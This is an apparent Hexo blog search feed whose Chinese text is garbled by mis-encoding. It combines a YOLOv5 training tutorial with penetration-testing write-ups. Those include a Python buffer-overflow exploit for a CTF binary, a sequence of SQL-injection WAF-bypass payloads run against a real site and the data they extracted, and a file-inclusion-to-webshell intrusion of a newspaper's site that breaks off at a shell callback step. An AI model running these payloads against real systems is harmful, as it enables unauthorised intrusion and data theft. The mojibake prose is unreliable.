&amp;func</span><br></pre></td></tr></table></figure><p>ç»™$rdxèµ‹è¯¥å€¼åç»§ç»­è¿è¡Œå³å¯æ‹¿åˆ°shell<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401152209524.png" width="75%" height="auto"></p><p>ç»è§‚å¯Ÿåœ¨+81å¤„,è·å–rdxçš„å€¼,<br>åœ¨inputå¤„è¾“å…¥aaaaaa,åˆ°+81å¤„æ—¶ç”¨xç¼–è¯‘çœ‹rdp-0x20çš„å€¼<br>å‘ç°åˆšæ‰è¾“å…¥çš„aæœ‰ä¸¤ä¸ªæº¢å‡ºåˆ°äº†$rdp-0x10ä¸­,æ„å‘³ç€è¾“å…¥å››ä¸ªå­—ç¬¦åè¾“å…¥çš„å€¼ä¼šç»™rdx<br>å³gxç¼–è¯‘ä¸­çš„ä¸€è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401152216514.png" width="75%" height="auto"><br>func åœ°å€ä¸º:0x555555555232</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡ç»™è¯¥åœ°å€èµ‹å€¼ä»è€Œå½“</span><br><span class="line">set *(long long int *)0x7fffffffe350=(long long int)0x555555555232</span><br></pre></td></tr></table></figure><p>ç»§ç»­è¿è¡Œå³å¯è·å–shell</p><p>2.é€šè¿‡nopieç¼–è¯‘å,æ‰¾åˆ°funcåœ°å€ç¼–å†™exp<br>funcåœ°å€ä¸º: 0x40121f,æ³¨æ„å°ç«¯åºè„šæœ¬ä¸­è¦æ”¹ä¸º(\x1f\x12\x40\x00\x00\x00\x00\x00)<br>åœ¨pythonä¸­ä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8845</span>))</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;\x1f\x12\x40\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">    s.sendall(payload + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    t = telnetlib.Telnet()</span><br><span class="line">    t.sock = s</span><br><span class="line">    t.interact()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yolov5å…¥é—¨</title>
      <link href="/2024/03/22/yolov5%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/22/yolov5%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>è¯¾ç¨‹é“¾æ¥: <a href="https://www.bilibili.com/video/BV1G24y1G7qm/?spm_id_from=333.788">https://www.bilibili.com/video/BV1G24y1G7qm/?spm_id_from=333.788</a></p><h2 id="1-ç¯å¢ƒå®‰è£…"><a href="#1-ç¯å¢ƒå®‰è£…" class="headerlink" title="1.ç¯å¢ƒå®‰è£…"></a>1.ç¯å¢ƒå®‰è£…</h2><p>Miniconda:<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda create -n yolov5 python=3.8</span><br><span class="line">conda activate yolov5</span><br><span class="line">#æ”¹æº</span><br><span class="line">pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå•ç‹¬çš„ç¯å¢ƒèƒ½ç”¨pipå°±ç”¨pipï¼Œå®åœ¨æœ‰é—®é¢˜ç”¨conda</p><p>å®‰è£…Pytorch pytorch.org<br>NVIDIAæ§åˆ¶é¢æ¿-&gt;ç³»ç»Ÿä¿¡æ¯-&gt;ç»„ä»¶å¯ä»¥çœ‹åˆ°CUDAä¿¡æ¯<br>å®‰è£…v1.8.2 CUDA11.2ï¼ˆ3060ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install torch==1.8.2 torchvision==0.9.2 torchaudio==0.8.2 --extra-index-url https://download.pytorch.org/whl/lts/1.8/cu111</span><br></pre></td></tr></table></figure><p>yolov5 <a href="https://github.com/ultralytics/yolov5">https://github.com/ultralytics/yolov5</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">numpy = 1.20.3</span><br></pre></td></tr></table></figure><p>æ£€æµ‹å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python detect.py</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202403211546382.png" width="90%"><h2 id="2-Yolov5æ¨¡å‹æ£€æµ‹"><a href="#2-Yolov5æ¨¡å‹æ£€æµ‹" class="headerlink" title="2.Yolov5æ¨¡å‹æ£€æµ‹"></a>2.Yolov5æ¨¡å‹æ£€æµ‹</h2><h3 id="1-å…³é”®å‚æ•°"><a href="#1-å…³é”®å‚æ•°" class="headerlink" title="1.å…³é”®å‚æ•°"></a>1.å…³é”®å‚æ•°</h3><p>weights : æŒ‡å®šè®­ç»ƒå¥½çš„æ¨¡å‹æ–‡ä»¶<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202403211604134.png" width="80%"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#detect.py</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;--weights&quot;</span>, nargs=<span class="string">&quot;+&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=ROOT / <span class="string">&quot;yolov5s.pt&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;model path or triton URL&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”¨yolov5sæ¨ç†</span></span><br><span class="line">python detect.py --weights yolov5s.pt</span><br></pre></td></tr></table></figure><p>2.source: æ£€æµ‹çš„ç›®æ ‡ï¼Œå¯ä»¥æ˜¯å•å¼ å›¾ç‰‡ã€æ–‡ä»¶å¤¹ã€å±å¹•æˆ–è€…æ‘„åƒå¤´ç­‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&quot;--source&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=ROOT / <span class="string">&quot;data/images&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;file/dir/URL/glob/screen/0(webcam)&quot;</span>)</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202403211606175.png" width="80%"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python detect.py --weights .\yolov5s.pt --source data/images/bus.jpg</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202403211609026.png" width="80%">3.conf-thres: ç½®ä¿¡åº¦é˜ˆå€¼ï¼Œè¶Šä½æ¡†è¶Šå¤šï¼Œè¶Šé«˜æ¡†è¶Šå°‘<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&quot;--conf-thres&quot;</span>, <span class="built_in">type</span>=<span class="built_in">float</span>, default=<span class="number">0.25</span>, <span class="built_in">help</span>=<span class="string">&quot;confidence threshold&quot;</span>)</span><br></pre></td></tr></table></figure>é»˜è®¤ç½®ä¿¡åº¦<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python detect.py --weights .\yolov5s.pt</span><br></pre></td></tr></table></figure>æŒ‡å®šç½®ä¿¡åº¦<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python detect.py --weights .\yolov5s.pt --conf-thres <span class="number">0.8</span></span><br><span class="line">python detect.py --weights .\yolov5s.pt --conf-thres <span class="number">0.05</span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202403211618900.png" width="80%">4.iou-thres: IOUé˜ˆå€¼ï¼Œè¶Šä½æ¡†è¶Šå°‘ï¼Œè¶Šé«˜æ¡†è¶Šå¤š<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&quot;--iou-thres&quot;</span>, <span class="built_in">type</span>=<span class="built_in">float</span>, default=<span class="number">0.45</span>, <span class="built_in">help</span>=<span class="string">&quot;NMS IoU threshold&quot;</span>)</span><br></pre></td></tr></table></figure><p>5.--imgsz è¾“å…¥å›¾åƒçš„å¤§å°ï¼Œé»˜è®¤640x640<br>6.â€“max-det ä¸€å¼ å›¾ç‰‡æœ€å¤§çš„æ£€æµ‹æ•°é‡<br>7.â€“device æŒ‡å®šè®¾å¤‡<br>8.â€“view-img æ£€æµ‹ç»“æœå¼¹çª—<br>9.â€“classes æŒ‡å®šè¦æ£€æµ‹çš„ç±»åˆ«</p><h3 id="2-åŸºäºtorch-hubæ£€æµ‹"><a href="#2-åŸºäºtorch-hubæ£€æµ‹" class="headerlink" title="2.åŸºäºtorch.hubæ£€æµ‹"></a>2.åŸºäºtorch.hubæ£€æµ‹</h3><p>å®‰è£…jupyter</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install jupyter</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch </span><br><span class="line"><span class="comment">#Model</span></span><br><span class="line"><span class="comment">#æœ¬åœ°load</span></span><br><span class="line">model = torch.hub.load(<span class="string">&quot;./&quot;</span>,<span class="string">&quot;yolov5s&quot;</span>,source=<span class="string">&quot;local&quot;</span>)</span><br><span class="line"><span class="comment">#Images</span></span><br><span class="line">img = <span class="string">&quot;./date/images/zidane.jpg&quot;</span></span><br><span class="line">results = model(img)</span><br><span class="line">results.show()</span><br></pre></td></tr></table></figure><h2 id="3-æ•°æ®é›†æ„å»º"><a href="#3-æ•°æ®é›†æ„å»º" class="headerlink" title="3.æ•°æ®é›†æ„å»º"></a>3.æ•°æ®é›†æ„å»º</h2><ul><li>å‡†å¤‡å·¥ä½œ<ul><li>æ•°æ®æ”¶é›†<ul><li>å›¾ç‰‡ç±»å‹æ•°æ®</li><li>è§†é¢‘ç±»å‹æ•°æ®<ul><li>ä½¿ç”¨opencvè¿›è¡Œè§†é¢‘æŠ½å¸§</li></ul></li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰“å¼€è§†é¢‘æ–‡ä»¶</span></span><br><span class="line">video = cv2.VideoCapture(<span class="string">&quot;./BVN.mp4&quot;</span>)</span><br><span class="line"><span class="comment">#è¯»å–ä¸€å¸§</span></span><br><span class="line">ret, frame = video.read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#cvè¯»å–æ—¶ä¸æ˜¯æŒ‰ç…§rgbé€šé“ï¼Œå›¾ç‰‡æ ¼å¼æ˜¯bgr</span></span><br><span class="line">plt.imshow(frame)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¦‚æœæƒ³çœ‹ä¸€æ ·çš„å›¾ç‰‡ï¼Œè½¬æ¢é€šé“</span></span><br><span class="line">plt.imshow(cv2.cvtColor(frame,cv2.COLOR_BGR2RGB))</span><br><span class="line"></span><br><span class="line">video = cv2.VideoCapture(<span class="string">&quot;./BVN.mp4&quot;</span>)</span><br><span class="line">num = <span class="number">0</span> Â  Â  Â  Â  <span class="comment"># è®¡æ•°å™¨</span></span><br><span class="line">save_step = <span class="number">30</span> Â <span class="comment"># é—´éš”å¸§</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">Â  Â  ret,frame = video.read()</span><br><span class="line">Â  Â  <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">break</span></span><br><span class="line">Â  Â  num += <span class="number">1</span></span><br><span class="line">Â  Â  <span class="keyword">if</span> num % save_step == <span class="number">0</span>:</span><br><span class="line">Â  Â  Â  Â  cv2.imwrite(<span class="string">&quot;./images/&quot;</span> + <span class="built_in">str</span>(num) + <span class="string">&quot;.jpg&quot;</span>,frame)</span><br></pre></td></tr></table></figure><p>æ ‡æ³¨å·¥å…·<br>labelimg</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install labelimg</span><br></pre></td></tr></table></figure><p>é€ä¸ªæ ‡æ³¨</p><h2 id="4-æ¨¡å‹è®­ç»ƒ"><a href="#4-æ¨¡å‹è®­ç»ƒ" class="headerlink" title="4.æ¨¡å‹è®­ç»ƒ"></a>4.æ¨¡å‹è®­ç»ƒ</h2><p>images: å­˜æ”¾å›¾ç‰‡<br>train: è®­ç»ƒé›†å›¾ç‰‡<br>val: éªŒè¯é›†å›¾ç‰‡</p><p>labels: å­˜æ”¾æ ‡ç­¾<br>train: è®­ç»ƒé›†æ ‡ç­¾æ–‡ä»¶ï¼Œè¦ä¸è®­ç»ƒé›†å›¾ç‰‡åç§°ä¸€ä¸€å¯¹åº”<br>val: éªŒè¯é›†æ ‡ç­¾æ–‡ä»¶ï¼Œè¦ä¸éªŒè¯é›†å›¾ç‰‡åç§°ä¸€ä¸€å¯¹åº”</p><p>imageså’Œlabelsä¸­çš„trainå’Œvalè¦å¯¹åº”<br>classes.txtæ–‡ä»¶ä¸­çš„æ˜¯ç±»å</p><h3 id="train-py"><a href="#train-py" class="headerlink" title="train.py"></a>train.py</h3><p>weights é¢„è®­ç»ƒçš„æƒé‡æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&quot;--weights&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=ROOT / <span class="string">&quot;yolov5s.pt&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;initial weights path&quot;</span>)</span><br></pre></td></tr></table></figure><p>data:æ•°æ®é›†æè¿°æ–‡ä»¶ </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">&quot;--data&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=ROOT / <span class="string">&quot;data/coco128.yaml&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;dataset.yaml path&quot;</span>)</span><br></pre></td></tr></table></figure><p>è·¯å¾„æŒ‡å®šä¸ºdata&#x2F;bvn.yaml</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># YOLOv5 ğŸš€ by Ultralytics, AGPL-3.0 license</span></span><br><span class="line"><span class="comment"># COCO128 dataset https://www.kaggle.com/ultralytics/coco128 (first 128 images from COCO train2017) by Ultralytics</span></span><br><span class="line"><span class="comment"># Example usage: python train.py --data coco128.yaml</span></span><br><span class="line"><span class="comment"># parent</span></span><br><span class="line"><span class="comment"># â”œâ”€â”€ yolov5</span></span><br><span class="line"><span class="comment"># â””â”€â”€ datasets</span></span><br><span class="line"><span class="comment"># Â  Â  â””â”€â”€ coco128 Â â† downloads here (7 MB)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Train/val/test sets as 1) dir: path/to/imgs, 2) file: path/to/imgs.txt, or 3) list: [path/to/imgs1, path/to/imgs2, ..]</span></span><br><span class="line"><span class="attr">path:</span> <span class="string">./yolov5test</span> <span class="comment">#æŒ‡å®šæ•°æ®é›†æ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="attr">train:</span> <span class="string">images/train</span> <span class="comment">#æŒ‡å®šæ•°æ®é›†</span></span><br><span class="line"><span class="attr">val:</span> <span class="string">images/val</span> <span class="comment">#æŒ‡å®šè®­ç»ƒé›†</span></span><br><span class="line"><span class="attr">test:</span> <span class="comment"># test images (optional)</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># Classes</span></span><br><span class="line"><span class="attr">names:</span></span><br><span class="line">Â  <span class="attr">0:</span> <span class="string">ymgs</span></span><br><span class="line">Â  <span class="attr">1:</span> <span class="string">gyd</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python train.py</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202403211858196.png" width="80%">è®­ç»ƒçš„ç»“æœæ”¾åœ¨runs\\train\\expæ–‡ä»¶å¤¹ä¸‹å…¶ä¸‹çš„best.ptæ˜¯æœ€å¥½çš„æ¨¡å‹è¿˜æœ‰ä¸€äº›å…¶ä»–çš„ç»“æœevents...ç­‰æ–‡ä»¶å¯ä»¥æŸ¥çœ‹è®­ç»ƒè¿‡ç¨‹ä¸­å„é¡¹æŒ‡æ ‡çš„å˜åŒ–<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tensorboard --logdir runs</span><br></pre></td></tr></table></figure>å¯è§†åŒ–å±•ç¤ºç»“æœ<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python detect.py --weights runs/train/exp3/weights/best.pt --source yolov5test/test.mp4 --view-img</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202403221832086.png" width="80%">]]></content>
      
      
      <categories>
          
          <category> äººå·¥æ™ºèƒ½ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äººå·¥æ™ºèƒ½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€æ¬¡SQLæ³¨å…¥WAFç»•è¿‡è®°å½•</title>
      <link href="/2024/01/30/%E4%B8%80%E6%AC%A1SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/01/30/%E4%B8%80%E6%AC%A1SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="1-æ¸—é€ç›®æ ‡"><a href="#1-æ¸—é€ç›®æ ‡" class="headerlink" title="1.æ¸—é€ç›®æ ‡"></a>1.æ¸—é€ç›®æ ‡</h2><p>https:&#x2F;&#x2F;[æŸç«™ç‚¹]&#x2F;new.php?id&#x3D;</p><h2 id="2-ç»•WAF"><a href="#2-ç»•WAF" class="headerlink" title="2.ç»•WAF"></a>2.ç»•WAF</h2><p>é—­åˆæ–¹å¼åˆ¤æ–­<br><img src="https://cdn.jsdelivr.net/gh/0Rec1us/picorep//img/20240130152312.png" width="100%" height="auto"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; --+ </span><br><span class="line">//æŠ¥é”™ä¸º &#x27;&#x27;&#x27;  -&gt; --+è¢«è¿‡æ»¤</span><br><span class="line"></span><br><span class="line">ç”¨ä»¥ä¸‹æ–¹å¼éƒ½å¯ä»¥è¿‡</span><br><span class="line">?id=1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27; || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥æ³¨åº“å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%27%20||%20extractvalue(1,concat(0x7e,(select%20database()),0x7e))%20||%20%271%27=%271</span><br><span class="line">//XPATH syntax error: &#x27;~iibnbnet_unidatabase~&#x27;</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥æ³¨è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%27%20||%20extractvalue(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27iibnbnet_unidatabase%27%20limit%200,1),0x7e))%20||%20%271%27=%271</span><br><span class="line">//æ— å†…å®¹è¿”å›ï¼Œè¯­å¥æ•´ä½“ä¸ºçœŸ -&gt; æŸ¥è¡¨åè¯­å¥è¢«è¿‡æ»¤</span><br><span class="line"></span><br><span class="line">å†…è”æ³¨é‡Š</span><br><span class="line">1%27%20||%20extractvalue(1,concat(0x7e,(/*!select*/%20/*!table_name*/%20/*!from*/%20/*!information_schema.tables*/%20/*!where*/%20/*!table_schema=%27iibnbnet_unidatabase%27*/%20/*!limit%200,1*/),0x7e))%20||%20%271%27=%271</span><br><span class="line">//æ— å†…å®¹è¿”å›ï¼Œè¯­å¥æ•´ä½“ä¸ºçœŸ </span><br><span class="line"></span><br><span class="line">å¤§å°å†™ç»•è¿‡</span><br><span class="line">id=1%27%20||%20extractvalue(1,concat(0x7e,(/*!sElect*/%20/*!table_name*/%20/*!from*/%20/*!information_schema.tables*/%20/*!wHere*/%20/*!table_schema=%27iibnbnet_unidatabase%27*/%20/*!limit%200,1*/),0x7e))%20||%20%271%27=%271</span><br><span class="line">//æ— å†…å®¹è¿”å›ï¼Œè¯­å¥æ•´ä½“ä¸ºçœŸ</span><br><span class="line"></span><br><span class="line">hexç¼–ç ç»•è¿‡</span><br><span class="line">//æ— è¿”å›å†…å®¹ï¼Œè¯­å¥æ•´ä½“ä¸ºçœŸ</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æƒ³åˆ°äº†ç¬¬ä¸€æ­¥çš„\å¯ä»¥çˆ†å‡ºå‰åè¯­å¥ä»è€Œåˆ¤æ–­æ˜¯å¦æœ‰è¯­å¥è¢«è¿‡æ»¤ï¼Œä½†æ˜¯æŠŠæŸ¥è¯­å¥ä¸€ä¸ªä¸€ä¸ªå¸¦è¿›å»åå‘ç°æ‰€æœ‰å•ç‹¬çš„è¯éƒ½æ²¡è¢«è¿‡æ»¤ï¼Œåˆ¤æ–­æ˜¯ç»„åˆè¯­å¥è¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹è¯­å¥åšå†…è”æ³¨é‡Š</span><br><span class="line">?id=1%27%20||%20/*!extractvalue(1,concat(0x7e,(/*!sElect*/%20/*!table_name*/%20/*!from*/%20/*!information_schema.tables*/%20/*!wHere*/%20/*!table_schema=%27iibnbnet_unidatabase%27*/%20/*!limit%200,1*/),0x7e))*/%20||%20%271%27=%271</span><br><span class="line">//You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;/ || &#x27;1&#x27;=&#x27;1&#x27;&#x27; at line 1</span><br><span class="line">//æœ‰å¯èƒ½)+*è¢«è¿‡æ»¤ï¼Œæœ€åçš„æ³¨é‡Šç¬¦æ²¡èµ·ä½œç”¨</span><br><span class="line"></span><br><span class="line">å°†æœ€åçš„æ³¨é‡Šç¬¦ä½ç½®æ”¹åˆ°æœ€å</span><br><span class="line">?id=1%27%20||%20/*!extractvalue(1,concat(0x7e,(/*!sElect*/%20/*!table_name*/%20/*!from*/%20/*!information_schema.tables*/%20/*!wHere*/%20/*!table_schema=%27iibnbnet_unidatabase%27*/%20/*!limit%200,1*/),0x7e))%20||%20%271%27=%271*/</span><br><span class="line">//æˆåŠŸå–å‡ºè¡¨å</span><br><span class="line">//XPATH syntax error: &#x27;~uni_albumlist~&#x27;</span><br><span class="line"></span><br><span class="line">//æŠŠ/*!ä½ç½®å¾€å‰æ”¾ä¹Ÿå¯ä»¥ç»•è¿‡</span><br><span class="line">?id=1/*!%27%20||%20extractvalue(1,concat(0x7e,(/*!sElect*/%20/*!table_name*/%20/*!from*/%20/*!information_schema.tables*/%20/*!wHere*/%20/*!table_schema=%27iibnbnet_unidatabase%27*/%20/*!limit%200,1*/),0x7e))%20||%20%271%27=%271*/</span><br><span class="line">//XPATH syntax error: &#x27;~uni_albumlist~&#x27;</span><br></pre></td></tr></table></figure><p>ç”¨å­æŸ¥è¯¢ä¹Ÿå¯ç»•è¿‡waf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1=(SELECT%201%20FROM%20dual%20WHERE%201%27%20||extractvalue(1,concat(0x7e,(/*!select*/%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20like%20%27iibnbnet_unidatabase%27),0x7e))||%20%271%27=%271)</span><br><span class="line">//whereä¹‹åçš„å³æ˜¯æˆ‘ä»¬åŸæ¥çš„payload</span><br></pre></td></tr></table></figure><p>åç»­åˆ—åä¸è¡¨ä¿¡æ¯é‡‡ç”¨ç›¸åŒæ–¹æ³•å¯ä»¥ç»•è¿‡wafã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€å®æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«+phpinfoç»„åˆæ‹¿ä¸‹ç«™ç‚¹</title>
      <link href="/2024/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB+phpinfo%E7%BB%84%E5%90%88%E6%8B%BF%E4%B8%8B%E7%AB%99%E7%82%B9/"/>
      <url>/2024/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB+phpinfo%E7%BB%84%E5%90%88%E6%8B%BF%E4%B8%8B%E7%AB%99%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="1-ç›®æ ‡èµ„äº§"><a href="#1-ç›®æ ‡èµ„äº§" class="headerlink" title="1.ç›®æ ‡èµ„äº§"></a>1.ç›®æ ‡èµ„äº§</h2><p>æŸæŠ¥ç¤¾</p><h2 id="2-æ¸—é€æµç¨‹"><a href="#2-æ¸—é€æµç¨‹" class="headerlink" title="2.æ¸—é€æµç¨‹"></a>2.æ¸—é€æµç¨‹</h2><p>1.gitæ³„éœ²,gitdumpè·å–æºç ,å®¡è®¡å‡ºæ–‡ä»¶åŒ…å«</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// check session</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">// è¼‰å…¥å°ˆæ¡ˆè¨­å®šæª”</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config/dbconfig.php&quot;</span>);      <span class="comment">//è¼‰å…¥è³‡æ–™</span></span><br><span class="line"><span class="comment">// JQnets Key è¼‰å…¥</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$JQlibs_path</span>.<span class="string">&quot;phop/contrller/ajax_key.php&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))?<span class="string">&quot;&quot;</span>:<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="comment">//è¼‰å…¥å‡½å¼åº«èˆ‡è¨­å®šæª”</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$JQlibs_path</span>.<span class="variable">$filename</span>);               <span class="comment">// è¼‰å…¥è¨­å®šæª”</span></span><br><span class="line"><span class="comment">//æ²¡æœ‰è¿‡æ»¤,åˆ™æŒ‡å®šfilenameå³å¯å®ç°æ–‡ä»¶åŒ…å«</span></span><br><span class="line"><span class="comment">//filename=../../../../../../../../../../etc/passwd</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>2.upload&#x2F;users&#x2F;ä¸‹å›¾ç‰‡å­˜åœ¨å¼‚å¸¸å›¾ç‰‡,é€šè¿‡æºç è¯»å‡ºæ¥å‘ç°æ˜¯phpinfo()<br>å¯èƒ½æ˜¯ä¹‹å‰çš„å¸ˆå‚…ä¼ ä¸Šå»çš„<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401251031518.png" width="75%" height="auto"></p><p>é€šè¿‡æ–‡ä»¶åŒ…å«å¾—åˆ°phpinfoé¡µé¢<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401231023928.png" width="75%" height="auto"></p><p>3.æ–‡ä»¶åŒ…å«+phpinfo()å†™å…¥webshellè¾¾æˆrce<br>exp<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401231037440.png" width="75%" height="auto"><br>å…¶ä»–éƒ¨åˆ†ä¸åŸexpä¸€è‡´</p><p>æˆåŠŸä¸Šä¼ shellåˆ°&#x2F;tmp&#x2F;g<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401231032128.png" width="75%" height="auto"><br>èšå‰‘è¿æ¥<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401231034367.png" width="75%" height="auto"><br>å…¶ä»–è®¾ç½®-&gt;é€‰æ‹©å¿½ç•¥httpsè¯ä¹¦,æˆåŠŸä¸Šä¼ <br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401231035099.png" width="75%" height="auto"></p><p>4.ä¼ å›shellææƒ<br>è¯•äº†å‡ ç§æœ‰çš„ä¸è¡Œ,æœ€ç»ˆç”¨pythonå›ä¼ 